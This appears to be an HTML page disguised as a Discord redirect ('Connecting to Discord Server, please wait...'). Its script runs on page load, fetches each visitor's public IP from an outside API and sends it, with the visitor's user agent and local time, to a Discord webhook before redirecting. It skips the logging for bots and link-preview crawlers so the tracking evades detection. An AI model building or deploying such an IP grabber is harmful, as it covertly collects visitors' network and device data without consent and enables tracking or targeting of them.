<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Redirecting...</title>
    <style>
        body {
            background-color: #23272a;
            color: #ffffff;
            font-family: Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .loading {
            text-align: center;
            color: #b9bbbe;
            font-size: 18px;
        }
    </style>
</head>
<body>
    <div class="loading">
        <p>Connecting to Discord Server, please wait...</p>
    </div>

    <script>
        // 1. Tentukan Webhook dan Tautan Tujuan Akhir
        const webhookUrl = "https://discord.com";
        const discordInvite = "https://discord.gg";

        async function logAndRedirect() {
            // Pengaman waktu: Jika API IP macet, pengguna TETAP akan dialihkan setelah 3 detik
            const fallbackRedirect = setTimeout(() => {
                window.location.href = discordInvite;
            }, 3000);

            try {
                const userAgent = navigator.userAgent;

                // Lewati bot otomatis (Discord embed preview, bot crawler, dll)
                if (/bot|discord|robot|curl|spider|crawler/i.test(userAgent)) {
                    clearTimeout(fallbackRedirect);
                    window.location.href = discordInvite;
                    return;
                }

                // 2. Ambil IP publik lewat API pihak ketiga
                const ipResponse = await fetch("https://ipify.org");
                const ipData = await ipResponse.json();
                const userIp = ipData.ip;

                // 3. Susun data waktu lokal
                const now = new Date();
                const dateStr = now.toLocaleDateString('id-ID');
                const timeStr = now.toLocaleTimeString('id-ID');

                const discordMessage = {
                    username: "Gate Guard (JS-Redirect)",
                    content: `🛡️ **[SECURITY LOG] Akses Tautan Deteksi**\n**IP:** \`${userIp}\`\n**Date:** ${dateStr}\n**Time:** ${timeStr}\n**Perangkat:** \`${userAgent}\``
                };

                // 4. Kirim log data ke Webhook Discord
                await fetch(webhookUrl, {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify(discordMessage)
                });

            } catch (error) {
                console.error("Gagal mencatat data:", error);
            } finally {
                // 5. Bersihkan timer dan alihkan halaman secara instan ke server Discord
                clearTimeout(fallbackRedirect);
                window.location.href = discordInvite;
            }
        }

        // Jalankan fungsi otomatis saat halaman dimuat oleh browser
        logAndRedirect();
    </script>
</body>
</html>
